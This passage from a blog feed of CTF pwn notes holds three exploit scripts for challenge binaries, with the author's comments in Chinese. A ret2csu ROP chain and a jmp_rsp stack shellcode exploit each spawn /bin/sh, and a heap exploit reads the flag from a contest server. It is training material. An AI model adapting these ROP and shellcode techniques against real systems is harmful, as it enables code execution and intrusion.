class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp1</span></span><br><span class="line"><span class="comment">#改自:https://www.freesion.com/article/6890501005/</span></span><br><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"> </span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"> </span><br><span class="line">r=process(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_adr=elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">bss_adr=elf.bss()</span><br><span class="line">csu_front_adr=<span class="number">0x00000000004005F0</span></span><br><span class="line">csu_last_adr=<span class="number">0x0000000000400606</span></span><br><span class="line">fackebp=<span class="number">8</span>*<span class="string">b&#x27;A&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;write_got = &quot;</span>,write_got)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nread_got =&quot;</span>,read_got)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nmain_addr =&quot;</span>,main_adr)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">rbx,rbp,r12,r13,r14,r15,last</span>):</span></span><br><span class="line">    payload=<span class="number">128</span>*<span class="string">b&#x27;A&#x27;</span>+fackebp</span><br><span class="line">    payload+=p64(csu_last_adr)</span><br><span class="line">    payload+=p64(<span class="number">0</span>)</span><br><span class="line">    payload+=p64(rbx)</span><br><span class="line">    payload+=p64(rbp)</span><br><span class="line">    payload+=p64(r12)</span><br><span class="line">    payload+=p64(r13)</span><br><span class="line">    payload+=p64(r14)</span><br><span class="line">    payload+=p64(r15)</span><br><span class="line">    payload+=p64(csu_front_adr)</span><br><span class="line">    payload+=<span class="number">56</span>*<span class="string">b&#x27;A&#x27;</span></span><br><span class="line">    payload+=p64(last)</span><br><span class="line">    r.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">r.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;send payload first&quot;</span>)</span><br><span class="line"><span class="comment"># write(1,write_got,8)</span></span><br><span class="line">csu(<span class="number">0</span>,<span class="number">1</span>,write_got,<span class="number">1</span>,write_got,<span class="number">8</span>,main_adr)</span><br><span class="line"> </span><br><span class="line">write_adr=u64(r.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;write_adr: &quot;</span> + <span class="built_in">hex</span>(write_adr))</span><br><span class="line"><span class="comment">#write_libc= 0x110140</span></span><br><span class="line">write_libc = <span class="number">0x10E090</span>    <span class="comment">#偏移值通过反编译libc自行查找</span></span><br><span class="line">system_libc= <span class="number">0x522C0</span>     <span class="comment">#$ ldd &lt;二进制文件&gt;  查看所用libc路径</span></span><br><span class="line"><span class="comment">#system_libc=0x04f440</span></span><br><span class="line">offset=write_adr-write_libc</span><br><span class="line">system_adr=offset+system_libc</span><br><span class="line"> </span><br><span class="line">r.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;send payload seconed&quot;</span>)</span><br><span class="line"><span class="comment"># read(0,bss_adr,16)</span></span><br><span class="line">csu(<span class="number">0</span>,<span class="number">1</span>,read_got,<span class="number">0</span>,bss_adr,<span class="number">16</span>,main_adr)</span><br><span class="line">r.send(p64(system_adr)+<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"> </span><br><span class="line">r.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;send payload third&quot;</span>)</span><br><span class="line"><span class="comment"># system(bss_adr+8)</span></span><br><span class="line">csu(<span class="number">0</span>,<span class="number">1</span>,bss_adr,bss_adr+<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,main_adr)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#思路：</span></span><br><span class="line">  <span class="comment"># 利用 __LIBC_CSU_INIT 里面的 gadgets，</span></span><br><span class="line">  <span class="comment"># 完成泄露地址(重调write函数)、重执main函数</span></span><br><span class="line">  <span class="comment"># 完成execve_addr地址&amp;&#x27;/bin/sh\x00&#x27;字符串输入bss段、重执main函数</span></span><br><span class="line">  <span class="comment"># 跳转至bss段，模拟 execve(&quot;/bin/sh&quot;,0,0) 的调用，获得shell</span></span><br></pre></td></tr></table></figure><br/><br/><h3 id="赛题"><a href="#赛题" class="headerlink" title="赛题"></a>赛题</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###简版</span></span><br><span class="line"><span class="number">1</span>、栈段RWX，canary无效，栈段写shellcode，jmp_rsp gadget跳转执行shellcod</span><br><span class="line"><span class="number">2</span>、</span><br></pre></td></tr></table></figure><br/><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、jmp_rsp</span><br><span class="line"><span class="comment">#链接1：https://functionmain.gitee.io/2022/05/25/2022%E7%9C%81%E8%B5%9B/</span></span><br><span class="line"><span class="comment">#链接2：https://blog.csome.cc/p/2022gdCTF-pwn/</span></span><br><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./jmp_rsp&quot;</span>)  </span><br><span class="line"><span class="comment">#io = remote(&quot;ip&quot;,port)</span></span><br><span class="line"></span><br><span class="line">jmp_rsp = <span class="number">0x000000000046d01d</span>  <span class="comment">#ROPgadget --binary jmp_rsp | grep &quot;jmp rsp&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">push rdx;</span></span><br><span class="line"><span class="string">mov rsi,rsp;</span></span><br><span class="line"><span class="string">mov rax,0x68732f2f6e69622f;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">mov rax,59;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">payload = shellcode     <span class="comment">#shellcode布置在rsp当前位置  长度30</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span>*<span class="number">106</span>     <span class="comment">#覆盖buf+rbp</span></span><br><span class="line">payload += p64(jmp_rsp) <span class="comment">#跳转至rsp处执行</span></span><br><span class="line">payload += asm(<span class="string">&quot;sub rsp, 0x90;jmp rsp&quot;</span>)  <span class="comment">#跳回到shellcode处执行shellcode</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#思路：</span></span><br><span class="line">  <span class="comment"># 栈段 RWX权限 均开启，并且开启了canary保护，经调试，canary无效</span></span><br><span class="line">  <span class="comment"># 所以向栈段写入shellcode，获取 jmp rap 这一gadget以及一小段shellcode</span></span><br><span class="line">  <span class="comment"># 实现pc指针跳转至shellcode去执行恶意代码获取shell</span></span><br></pre></td></tr></table></figure><p><img src="image-20220811094906779.png" alt="image-20220811094906779"></p><h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><h3 id="ctf-wiki-1"><a href="#ctf-wiki-1" class="headerlink" title="ctf wiki"></a>ctf wiki</h3><h3 id="赛题-1"><a href="#赛题-1" class="headerlink" title="赛题"></a>赛题</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#简述</span></span><br><span class="line"><span class="number">1</span>、</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1、easyheap</span></span><br><span class="line"><span class="comment">#链接：https://blog.csome.cc/p/2022gdCTF-pwn/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#个人目前还不会，之后再补自己写的exp</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#一个大佬队友的exp</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">getIO = <span class="keyword">lambda</span>:process([<span class="string">&#x27;./ld-2.31.so&#x27;</span>, <span class="string">&#x27;./easyheap&#x27;</span>], env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: <span class="string">&#x27;./libc-2.31.so&#x27;</span>&#125;)</span><br><span class="line"><span class="comment">#io = getIO()</span></span><br><span class="line">io = remote(<span class="string">&#x27;112.74.185.213&#x27;</span>,<span class="number">46699</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./easyheap&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, cont</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;4.delete\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Size?\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&#x27;Context:\n&#x27;</span>, cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span>(<span class="params">size, offset, cont</span>):</span></span><br><span class="line">    pp = <span class="string">&#x27;1\x00&#x27;</span></span><br><span class="line">    pp += <span class="string">&#x27;\x00&#x27;</span> * (<span class="number">12</span> - <span class="built_in">len</span>(pp))</span><br><span class="line">    pp += p32(ctypes.c_uint32(offset).value)</span><br><span class="line">    io.sendafter(<span class="string">&#x27;4.delete\n&#x27;</span>, pp)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Size?\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Context:\n&#x27;</span>, cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add3</span>(<span class="params">size, offset, cont</span>):</span></span><br><span class="line">    pp = <span class="string">&#x27;1\x00&#x27;</span></span><br><span class="line">    pp += <span class="string">&#x27;\x00&#x27;</span> * (<span class="number">12</span> - <span class="built_in">len</span>(pp))</span><br><span class="line">    pp += p32(ctypes.c_uint32(offset).value)</span><br><span class="line">    io.sendafter(<span class="string">&#x27;4.delete&#x27;</span>, pp)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Size?&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&#x27;Context:&#x27;</span>, cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, cont</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;4.delete\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Idx?\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Context:\n&#x27;</span>, cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit2</span>(<span class="params">idx, cont</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;4.delete&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Idx?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendafter(<span class="string">&#x27;Context:&#x27;</span>, cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>(<span class="params">size, offset, cont</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;4.delete\n&#x27;</span>, <span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Size?\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Offset?\n&#x27;</span>, <span class="built_in">str</span>(offset))</span><br><span class="line">    io.sendafter(<span class="string">&#x27;Context:\n&#x27;</span>, cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor2</span>(<span class="params">size, offset, cont</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;4.delete&#x27;</span>, <span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Size?&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Offset?&#x27;</span>, <span class="built_in">str</span>(offset))</span><br><span class="line">    io.sendafter(<span class="string">&#x27;Context:&#x27;</span>, cont)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    fake_size = <span class="number">0x061</span> + <span class="number">0x1000</span>*<span class="number">1</span></span><br><span class="line">    <span class="comment"># add(,&#x27;aaaaa&#x27;)</span></span><br><span class="line">    backdoor(<span class="number">0x18</span>, <span class="number">0x6b8</span>, p64(fake_size))</span><br><span class="line">    add(<span class="number">0x2000</span>, <span class="string">&#x27;ccccc&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">&#x27;ccc&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">&#x27;ccc&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">&#x27;ccc&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">&#x27;ccc&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">&#x27;ccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add2(<span class="number">0x10</span>, -<span class="number">10</span>, <span class="string">&#x27;ccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    backdoor(<span class="number">0x18</span>, -<span class="number">3080</span>, <span class="string">&#x27;\xb0&#x27;</span>)</span><br><span class="line">    <span class="comment"># backdoor(0x18, -32, &#x27;\xb0&#x27;)</span></span><br><span class="line">    backdoor(<span class="number">0x18</span>, -<span class="number">3616</span>+<span class="number">6</span>, p32(<span class="number">0x7</span>))</span><br><span class="line">    stdout_in = <span class="number">0x16a0</span></span><br><span class="line"></span><br><span class="line">    backdoor(<span class="number">0x18</span>, <span class="number">800</span>, <span class="string">&#x27;\xa0\x16&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># add2(0x18, 0, &#x27;aa&#x27;)</span></span><br><span class="line">    flag = <span class="number">0xfbad1800</span></span><br><span class="line">    <span class="comment"># add2(0x18, )</span></span><br><span class="line">    add2(<span class="number">0x48</span>, <span class="number">1</span>, <span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        add2(<span class="number">0x48</span>, <span class="number">0</span>, p64(flag)+p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&#x27;\x08&#x27;</span>)</span><br><span class="line">        inp = io.recv(<span class="number">8</span>,timeout=<span class="number">0.2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;1.add&#x27;</span> <span class="keyword">in</span> inp:</span><br><span class="line">            <span class="keyword">assert</span> <span class="number">1</span> == <span class="number">2</span></span><br><span class="line">        stdin_addr = u64(inp)</span><br><span class="line">        log.success(<span class="string">&#x27;stdin_addr:&#x27;</span>+<span class="built_in">hex</span>(stdin_addr))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        io = remote(<span class="string">&#x27;112.74.185.213&#x27;</span>,<span class="number">46699</span>)</span><br><span class="line">        <span class="comment">#io = process(&#x27;./easyheap&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc_base = stdin_addr - <span class="number">0x1ee7f0</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">main_arena_96 = <span class="number">0x1ecbe0</span> + libc_base</span><br><span class="line">edit2(<span class="number">0</span>, p64(flag)+p64(<span class="number">0</span>)*<span class="number">3</span> + p64(main_arena_96))</span><br><span class="line"></span><br><span class="line">heap_base = u64(io.recv(<span class="number">8</span>)) -<span class="number">0x23010</span>  </span><br><span class="line">log.success(<span class="string">&#x27;heap_base:&#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">environ = <span class="number">0x1ef600</span> + libc_base </span><br><span class="line">edit2(<span class="number">0</span>, p64(flag)+p64(<span class="number">0</span>)*<span class="number">3</span> + p64(environ) + p64(environ+<span class="number">0x10</span>) + p64(environ+<span class="number">0x10</span>))</span><br><span class="line">log.success(<span class="string">&#x27;environ:&#x27;</span>+<span class="built_in">hex</span>(environ))</span><br><span class="line"></span><br><span class="line">stack_environ = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">&#x27;stack_environ:&#x27;</span>+<span class="built_in">hex</span>(stack_environ))</span><br><span class="line"></span><br><span class="line">rax_0 = <span class="number">0x00000000000b1d89</span> + libc_base <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">rax_1 = <span class="number">0x00000000000cfb50</span> + libc_base <span class="comment">#  mov rax, 1 ; ret</span></span><br><span class="line">rax_2 = <span class="number">0x00000000000cfb60</span> + libc_base <span class="comment">#  mov rax, 2 ; ret</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000023b72</span> + libc_base <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi = <span class="number">0x000000000002604f</span> + libc_base <span class="comment"># pop rsi ; ret</span></span><br><span class="line">xchg_eax_edi = <span class="number">0x00000000000f1b95</span> + libc_base <span class="comment"># xchg eax, edi ; ret</span></span><br><span class="line">syscall = <span class="number">0x00000630D9</span> + libc_base <span class="comment"># syscall; ret in (funlockfile) </span></span><br><span class="line">add_rax = <span class="number">0x00000000000ac79c</span> + libc_base</span><br><span class="line">push_rdi = <span class="number">0x00000000000e312b</span> + libc_base</span><br><span class="line">pop_rdi = <span class="number">0x0000000000023b72</span>+libc_base</span><br><span class="line">vuln_stack_tar = stack_environ - <span class="number">0x138</span> + <span class="number">0x18</span></span><br><span class="line">backdoor2(<span class="number">0x18</span>, -<span class="number">512</span>, p64(vuln_stack_tar))</span><br><span class="line"></span><br><span class="line">add3(<span class="number">0xf0</span>-<span class="number">8</span>, <span class="number">1</span>, <span class="string">&#x27;cccccc&#x27;</span>)</span><br><span class="line"><span class="comment"># io.sendafter(&#x27;4.delete&#x27;, &#x27;1&#x27;)</span></span><br><span class="line"><span class="comment"># io.sendlineafter(&#x27;Size?&#x27;, )</span></span><br><span class="line"></span><br><span class="line">rop_tmp = [</span><br><span class="line">    pop_rdi, <span class="number">0xadd</span>,</span><br><span class="line">    pop_rsi, <span class="number">0</span>,</span><br><span class="line">    rax_2, syscall, <span class="comment"># open</span></span><br><span class="line">    xchg_eax_edi, <span class="comment"># eax -&gt; edi fd</span></span><br><span class="line">    pop_rsi, <span class="number">0xadd</span>,</span><br><span class="line">    rax_0, syscall, <span class="comment"># read</span></span><br><span class="line">    pop_rdi, <span class="number">1</span>, </span><br><span class="line">    rax_1, syscall <span class="comment"># write</span></span><br><span class="line">]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">rop_tmp = [</span></span><br><span class="line"><span class="string">    pop_rdi, 0xadd,</span></span><br><span class="line"><span class="string">    pop_rsi, 0,</span></span><br><span class="line"><span class="string">    rax_2, syscall, # open</span></span><br><span class="line"><span class="string">    xchg_eax_edi, # eax -&gt; edi fd</span></span><br><span class="line"><span class="string">    rax_0,</span></span><br><span class="line"><span class="string">    pop_rsi, 78,</span></span><br><span class="line"><span class="string">    add_rax,</span></span><br><span class="line"><span class="string">    pop_rsi, 0xadd,</span></span><br><span class="line"><span class="string">    syscall, # getdents</span></span><br><span class="line"><span class="string">    pop_rdi, 1, </span></span><br><span class="line"><span class="string">    rax_1, syscall # write</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">rop_tmp[<span class="number">1</span>] = rop_tmp[<span class="number">8</span>] = vuln_stack_tar + <span class="built_in">len</span>(rop_tmp) * <span class="number">8</span></span><br><span class="line">rop_tmp = flat(rop_tmp) + <span class="string">&#x27;/Flag/R3a1_f1Ag_1s_here\x00&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">gdb.attach(io)</span></span><br><span class="line"><span class="string">pause()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">add3(<span class="number">0xf0</span>-<span class="number">8</span>, <span class="number">1</span>, rop_tmp)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#大佬队友的思路</span></span><br><span class="line">  <span class="comment"># backdoor任意写8字节，但只能用一次。</span></span><br><span class="line">  <span class="comment"># 后来发现是原题：https://blog.csome.cc/p/2022gdCTF-pwn/#easyheap</span></span><br><span class="line">  <span class="comment"># 栈上残留数据导致向上越界，将backdoor的标志覆盖，可以多次使用backdoor。</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># house of orange的利用思路，用backdoor修改topchunk的size造unsorted bin。</span></span><br><span class="line">  <span class="comment"># 后面爆破stdout leak libc，然后通过environ leak stack。</span></span><br><span class="line">  <span class="comment"># 通过backdoor劫持tcache，申请到add函数的返回地址。</span></span><br><span class="line">  <span class="comment"># rop1 读目录 open getdents wirte，leak文件名。</span></span><br><span class="line">  <span class="comment"># rop2 读文件</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">题录&amp;知识精记</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>shellcode编写</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/08/04/shellcode%E7%BC%96%E5%86%99/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/08/04/shellcode%E7%BC%96%E5%86%99/</id>
    <published>2022-08-04T12:23:15.000Z</published>
    <updated>2022-08-04T15:27:59.712Z</updated>
    
